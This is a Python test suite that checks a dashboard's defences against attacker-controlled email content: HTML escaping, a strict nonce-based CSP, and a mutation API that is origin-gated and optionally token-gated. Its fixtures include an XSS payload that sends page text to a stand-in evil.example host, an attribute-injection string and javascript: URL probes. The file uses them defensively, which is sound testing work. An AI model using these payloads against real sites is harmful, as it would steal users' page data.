#!/usr/bin/env python3
"""Tests for the dashboard's XSS defences and API gate.

Every string the board renders (project names, ledger descriptions,
sender names, mail subjects) is attacker-controlled: it arrives in
inbound email. These tests pin the three layers that keep it inert:

  1. escaping — the page's own esc()/textContent path, exercised for
     real by rendering the drawer template in node and parsing the
     output as HTML;
  2. CSP — a nonce'd script-src, minted per response, with no
     'unsafe-inline' for scripts and no inline event handlers left in
     the page for it to have to cover;
  3. the mutation API — /api/op refuses anything that is not the board
     page itself, plus an optional shared secret over the whole surface.

Usage:
    python3 tests/test_dashboard_xss.py
"""

import http.client
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import traceback
from html.parser import HTMLParser
from http.server import ThreadingHTTPServer
from pathlib import Path

# No test may touch production state.
_TMP_EA = tempfile.mkdtemp(prefix="ea-test-dash-")
os.environ["EA_DIR"] = _TMP_EA

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "preprocessor"))

import project_dashboard as pd  # noqa: E402
import project_store as ps  # noqa: E402

HTML = (PROJECT_ROOT / "preprocessor" / "dashboard.html").read_text()
JS = re.search(r"<script[^>]*>(.*?)</script>", HTML, re.S).group(1)

PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example/?d=\'+document.body.innerText)">'
ATTR_PAYLOAD = '" autofocus onfocus="alert(1)'


# ── helpers ─────────────────────────────────────────────────────────────

def _drawer_template() -> str:
    """The page's single innerHTML template, brace/backtick safe: nested
    templates inside it never end with a backtick+semicolon."""
    start = JS.index("drawer.innerHTML = `") + len("drawer.innerHTML = ")
    end = JS.index("`;", start) + 1
    tpl = JS[start:end]
    assert "Recent mail" in tpl, "drawer template not extracted"
    return tpl


class _Collect(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags, self.attrs, self.text = [], [], []

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        for k, v in attrs:
            self.attrs.append((tag, k, v))

    def handle_data(self, data):
        self.text.append(data)


class _Serve:
    """The real Handler on a loopback port."""

    def __enter__(self):
        self.srv = ThreadingHTTPServer(("127.0.0.1", 0), pd.Handler)
        self.port = self.srv.server_address[1]
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *a):
        self.srv.shutdown()
        self.srv.server_close()

    def req(self, method, path, headers=None, body=None):
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        data = r.read().decode("utf-8", "replace")
        hdrs = {k.lower(): v for k, v in r.getheaders()}
        c.close()
        return r.status, hdrs, data


# ── 1. escaping ─────────────────────────────────────────────────────────

def test_esc_helper_renders_payload_inert(d):
    node = shutil.which("node")
    if not node:
        print("     (node not found — esc() runtime check skipped)", end="")
        return
    esc_src = "\n".join([
        re.search(r"const ESC_MAP = \{.*?\};", JS, re.S).group(0),
        re.search(r"function esc\(v\) \{.*?\n\}", JS, re.S).group(0),
        re.search(r"function safeHref\(u\) \{.*?\n\}", JS, re.S).group(0),
    ])
    harness = esc_src + r"""
const out = esc(PAYLOAD);
if (/[<>"'`]/.test(out)) throw new Error("raw markup survived: " + out);
if (out.indexOf("&lt;img") !== 0) throw new Error("not escaped: " + out);
if (esc("</textarea><script>x</script>").indexOf("<") >= 0)
  throw new Error("textarea break survived");
if (esc(null) !== "" || esc(undefined) !== "") throw new Error("nullish");
if (esc(0) !== "0") throw new Error("zero must render");
if (safeHref("javascript:alert(1)") !== "") throw new Error("js: url allowed");
if (safeHref("data:text/html,x") !== "") throw new Error("data: url allowed");
if (safeHref("//evil.example/x") !== "") throw new Error("protocol-relative");
if (safeHref("/open?ledger=a-1") !== "/open?ledger=a-1")
  throw new Error("relative link broken");
console.log("OK");
"""
    script = d / "esc.js"
    script.write_text(f"const PAYLOAD = {_js_str(PAYLOAD)};\n{harness}")
    r = subprocess.run([node, str(script)], capture_output=True, text=True,
                       timeout=60)
    assert r.returncode == 0, r.stderr
    assert "OK" in r.stdout


def _js_str(s: str) -> str:
    return ("'" + s.replace("\\", "\\\\").replace("'", "\\'")
            .replace("\n", "\\n") + "'")


def test_drawer_template_renders_payload_as_text(d):
    """Render the real drawer template with hostile values and parse the
    result: no tag, no attribute and no script may come out of the data."""
    node = shutil.which("node")
    if not node:
        print("     (node not found — drawer render check skipped)", end="")
        return
    template = _drawer_template()
    prelude = "\n".join([
        re.search(r"const ESC_MAP = \{.*?\};", JS, re.S).group(0),
        re.search(r"function esc\(v\) \{.*?\n\}", JS, re.S).group(0),
        re.search(r'const STATUSES = \[.*?\];', JS, re.S).group(0),
    ])
    script = d / "drawer.js"
    script.write_text(f"""{prelude}
const P = {_js_str(PAYLOAD)};
const A = {_js_str(ATTR_PAYLOAD)};
const f = {{name: P, domain: P, kind: P, parent_id: P, status: "active",
            summary: "</textarea>" + P, next_actions: A}};
const d = {{
  people: [{{name: P, email: P, role_in_project: P, person_notes: P, tone: P}}],
  open_items: [{{description: P, deadline: P}}],
  events: [{{ts: "2026-08-22T00:00:00Z", kind: P, text: P}}],
  messages: [{{received: "2026-08-22T00:00:00Z", direction: "in", subject: P}}],
}};
process.stdout.write({template});
""")
    r = subprocess.run([node, str(script)], capture_output=True, text=True,
                       timeout=60)
    assert r.returncode == 0, r.stderr
    out = r.stdout
    assert "<img" not in out, "unescaped payload reached the markup"
    parsed = _Collect()
    parsed.feed(out)
    assert "img" not in parsed.tags, parsed.tags
    assert "script" not in parsed.tags, parsed.tags
    bad = [a for a in parsed.attrs if a[1].startswith("on")]
    assert not bad, f"event-handler attribute injected: {bad}"
    # the input's value attribute holds the payload as DATA, and the
    # quote-break did not spawn autofocus/onfocus
    vals = [v for (t, k, v) in parsed.attrs if t == "input" and k == "value"]
    assert vals and vals[0] == ATTR_PAYLOAD, vals
    assert not [a for a in parsed.attrs if a[1] == "autofocus"]
    # the payload survives as visible text, so the board still SHOWS it
    assert any(PAYLOAD in t for t in parsed.text), "payload text lost"
    # and </textarea> in the summary did not close the textarea early
    assert out.count("</textarea>") == 1, out.count("</textarea>")


def _strip_esc_calls(s: str) -> str:
    """Blank out every esc(...) call, paren-matched."""
    out, i = [], 0
    while True:
        k = s.find("esc(", i)
        if k < 0:
            out.append(s[i:])
            return "".join(out)
        out.append(s[i:k])
        depth, j = 1, k + 4
        while j < len(s) and depth:
            if s[j] == "(":
                depth += 1
            elif s[j] == ")":
                depth -= 1
            j += 1
        out.append("ESCAPED")
        i = j


def test_every_interpolation_is_escaped(d):
    """Regression guard on the page's one HTML sink: after removing every
    esc(...) call, no untrusted field may remain in the drawer template
    except as a ternary test. Fails the moment someone writes a raw
    ${m.subject}."""
    fields = ("f.name", "f.domain", "f.kind", "f.parent_id", "f.summary",
              "f.next_actions", "p.name", "p.email", "p.person_notes",
              "p.tone", "p.role_in_project", "o.description", "o.deadline",
              "e.text", "e.kind", "e.ts", "m.subject", "m.received",
              "d.people", "d.open_items", "d.events", "d.messages")
    stripped = _strip_esc_calls(_drawer_template())
    pattern = "|".join(re.escape(f) for f in fields)
    for m in re.finditer(r"(?<![\w.])(" + pattern + r")\b", stripped):
        after = stripped[m.end():m.end() + 8].lstrip()
        before = stripped[:m.start()].rstrip()
        is_test = (after.startswith(("?", "||", "&&", "===", "!==", ".length"))
                   or re.search(r"(===|!==|&&|\|\|)$", before))
        assert is_test, (f"unescaped interpolation of {m.group(1)}: "
                         f"...{stripped[max(0, m.start() - 60):m.end() + 40]}...")


def test_no_inline_handlers_or_unsafe_sinks(d):
    """CSP forbids inline handlers, so none may remain in the markup; and
    innerHTML is the only HTML sink the page is allowed to use."""
    markup = re.sub(r"<script[^>]*>.*?</script>", "", HTML, flags=re.S)
    markup = re.sub(r"<!--.*?-->", "", markup, flags=re.S)
    handlers = re.findall(r"<[^>]*?\son[a-z]+\s*=", markup)
    assert not handlers, f"inline event handler left in markup: {handlers}"
    for sink in ("insertAdjacentHTML", "document.write", "outerHTML",
                 "eval(", "new Function", "srcdoc"):
        assert sink not in JS, f"unsafe sink {sink!r} in dashboard.html"
    # one HTML sink, and it is the drawer
    assert JS.count("innerHTML") == 1, "new innerHTML site — re-audit escaping"


# ── 2. CSP ──────────────────────────────────────────────────────────────

def test_csp_meta_is_strict(d):
    meta = re.search(r'<meta http-equiv="Content-Security-Policy" '
                     r'content="([^"]+)"', HTML)
    assert meta, "no CSP meta tag"
    csp = meta.group(1)
    assert "default-src 'none'" in csp
    assert "script-src 'nonce-__CSP_NONCE__'" in csp
    assert "connect-src 'self'" in csp
    assert "form-action 'none'" in csp
    assert "base-uri 'none'" in csp
    # scripts must NOT be inline-allowed; only styles are
    script_dir = re.search(r"script-src ([^;]+)", csp).group(1)
    assert "unsafe-inline" not in script_dir, script_dir
    assert "unsafe-eval" not in script_dir, script_dir
    assert "http" not in csp, "external origin allowed in CSP"
    assert HTML.count("__CSP_NONCE__") == 2, "nonce placeholder count"


def test_served_page_carries_a_fresh_nonce(d):
    with _Serve() as s:
        st, h, body = s.req("GET", "/")
        assert st == 200, st
        csp = h.get("content-security-policy", "")
        nonce = re.search(r"nonce-([A-Za-z0-9_-]+)", csp)
        assert nonce, csp
        assert "frame-ancestors 'none'" in csp
        assert h.get("x-content-type-options") == "nosniff"
        assert h.get("x-frame-options") == "DENY"
        assert h.get("referrer-policy") == "no-referrer"
        assert "__CSP_NONCE__" not in body, "nonce placeholder shipped raw"
        assert f'<script nonce="{nonce.group(1)}">' in body
        assert f"'nonce-{nonce.group(1)}'" in body   # the meta tag too
        st2, h2, body2 = s.req("GET", "/")
        n2 = re.search(r"nonce-([A-Za-z0-9_-]+)",
                       h2.get("content-security-policy", "")).group(1)
        assert n2 != nonce.group(1), "nonce is not per-response"


# ── 3. mutation API ─────────────────────────────────────────────────────

def test_api_op_refuses_cross_origin(d):
    ps.DB_PATH = d / "state" / "obligations-ledger.db"
    body = '{"op":"close_ledger","ledger_id":"led-1"}'
    with _Serve() as s:
        host = f"127.0.0.1:{s.port}"
        # a plain cross-site POST (no custom header) never lands
        st, _, out = s.req("POST", "/api/op", {"Content-Type": "text/plain"},
                           body)
        assert st == 403, (st, out)
        # nor one wearing another site's Origin
        st, _, out = s.req("POST", "/api/op",
                           {"Content-Type": "application/json",
                            "X-EA-Dashboard": "1",
                            "Origin": "https://evil.example"}, body)
        assert st == 403, (st, out)
        # nor one the browser labels cross-site
        st, _, out = s.req("POST", "/api/op",
                           {"Content-Type": "application/json",
                            "X-EA-Dashboard": "1",
                            "Sec-Fetch-Site": "cross-site"}, body)
        assert st == 403, (st, out)
        # the board's own call gets through (unknown op == it reached apply_op)
        st, _, out = s.req("POST", "/api/op",
                           {"Content-Type": "application/json",
                            "X-EA-Dashboard": "1",
                            "Origin": f"http://{host}",
                            "Sec-Fetch-Site": "same-origin"},
                           '{"op":"nope"}')
        assert st == 200, (st, out)
        assert "unknown op" in out, out


def test_optional_shared_secret(d):
    ps.DB_PATH = d / "state" / "obligations-ledger.db"
    pd.DASH_TOKEN = "s3cr3t-token"
    try:
        with _Serve() as s:
            assert s.req("GET", "/")[0] == 401
            assert s.req("GET", "/api/board")[0] == 401
            assert s.req("GET", "/open?ledger=x")[0] == 401
            assert s.req("GET", "/?t=s3cr3t-token")[0] == 200
            assert s.req("GET", "/", {"Authorization": "Bearer s3cr3t-token"}
                         )[0] == 200
            assert s.req("GET", "/", {"X-EA-Token": "s3cr3t-token"})[0] == 200
            assert s.req("GET", "/?t=wrong")[0] == 401
            st, _, out = s.req("POST", "/api/op",
                               {"Content-Type": "application/json",
                                "X-EA-Dashboard": "1"}, '{"op":"nope"}')
            assert st == 401, (st, out)
        # Slack's App Home links keep working under the gate
        assert "t=s3cr3t-token" in pd.absolute_email_link("/open?ledger=x")
    finally:
        pd.DASH_TOKEN = ""
    assert pd.absolute_email_link("/open?ledger=x").endswith("/open?ledger=x")


def main():
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    passed = failed = 0
    for t in tests:
        with tempfile.TemporaryDirectory() as d:
            try:
                t(Path(d))
                print(f"  ✅ {t.__name__}")
                passed += 1
            except Exception as e:
                print(f"  ❌ {t.__name__}: {e}")
                traceback.print_exc()
                failed += 1
    print(f"\n  {passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
